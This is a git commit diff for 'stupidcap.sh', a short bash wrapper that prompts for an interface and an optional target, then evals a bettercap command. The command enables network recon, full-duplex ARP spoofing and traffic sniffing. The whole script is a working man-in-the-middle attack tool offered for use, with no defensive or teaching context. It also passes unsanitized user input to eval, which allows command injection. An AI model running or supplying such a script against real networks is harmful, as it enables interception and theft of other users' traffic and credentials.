f0ebbb996c985574d55c8dbd3d6c540619254458
ciphxr <115801273+ciphxr@users.noreply.github.com>
2025-10-24 11:59:18 +0700

    Update stupidcap.sh

--- stupidcap.sh
+++ stupidcap.sh
@@ -3,7 +3,7 @@
 echo -n "Enter network interface: "
 read int
 
-if [ -z "$int" ]; then
+if [[ -z "$int" ]]; then
   echo "No interface provided. Exiting."
   exit 1
 fi
@@ -11,15 +11,12 @@ fi
 echo -n "Enter target IP or MAC address (or leave empty for all): "
 read target
 
-cmd="bettercap -iface $int"
-
-cmd+=" net.probe on; net.recon on; net.show on"
-cmd+="; set arp.spoof.fullduplex true"
-
-if [ ! -z "$target" ]; then
-  cmd+="; set arp.spoof.targets $target"
+cmd="bettercap -iface \"$int\" -eval \"net.probe on; net.recon on; net.show on; set arp.spoof.fullduplex true; "
+if [[ -n "$target" ]]; then
+  cmd+="set arp.spoof.targets $target; "
 fi
-cmd+="; arp.spoof on; net.sniff on"
+cmd+="arp.spoof on; net.sniff on\""
+
 echo "Starting Bettercap:"
 echo "$cmd"
 eval "$cmd"
